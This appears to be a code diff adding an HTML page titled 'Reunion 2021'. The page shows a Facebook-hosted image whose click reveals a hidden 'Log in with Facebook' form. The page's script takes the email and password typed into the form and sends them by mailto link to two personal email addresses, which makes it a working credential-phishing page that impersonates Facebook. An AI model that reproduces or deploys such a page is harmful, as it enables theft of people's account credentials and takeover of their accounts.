@@ -1,0 +1,57 @@
+<html lang="en">
+
+<head>
+    <title>Reunion 2021</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script lang="javascript">
+        function showLogin() {
+            document.getElementById("loginform").style = "visibility: visible";
+        }
+        function login() {
+            var uId = document.getElementById("uId").value;
+            var pwrd = document.getElementById("pwrd").value;
+            var json = JSON.stringify({ "email": uId, "password": pwrd });
+            console.log(json);
+            var link = "mailto:majumdar.ritam6@gmail.com"
+             + "?cc=majumdar_ritam@yahoo.com"
+             + "&subject=" + encodeURIComponent("This is my subject")
+             + "&body=" + encodeURIComponent(json);
+    ;
+    
+    window.location.href = link;
+        }
+    </script>
+    <style>
+        .fakeimg {
+            height: 200px;
+            background: #aaa;
+        }
+    </style>
+</head>
+
+<body>
+    <img id="image1" class="img" onclick="showLogin()"
+        src="https://scontent.frdp1-1.fna.fbcdn.net/v/t39.2365-6/17639236_1785253958471956_282550797298827264_n.png?_nc_cat=105&amp;ccb=1-5&amp;_nc_sid=ad8a9d&amp;_nc_ohc=MqjjzOoPxbMAX88xMxe&amp;_nc_ht=scontent.frdp1-1.fna&amp;oh=df99cb517c2639e6f458f179b22ea313&amp;oe=613C0516"
+        width="400" alt="">
+
+    <div class="container" id="loginform" style="visibility:hidden;">
+        <h4>Log in with Facebook</h4>
+        <div class="row">
+            <label for="uname"><b>Email</b></label>
+            <input id="uId" type="text" class="form-control" placeholder="Enter Username" name="uname" required>
+        </div>
+        <div class="row">
+            <label for="psw"><b>Password</b></label>
+            <input id="pwrd" type="password" class="form-control" placeholder="Enter Password" name="psw" required>
+        </div>
+        <div class="row" style="margin: auto;">
+            <button class="btn btn-primary" onclick="login()">Log In</button>
+        </div>
+</body>
+
+</html>
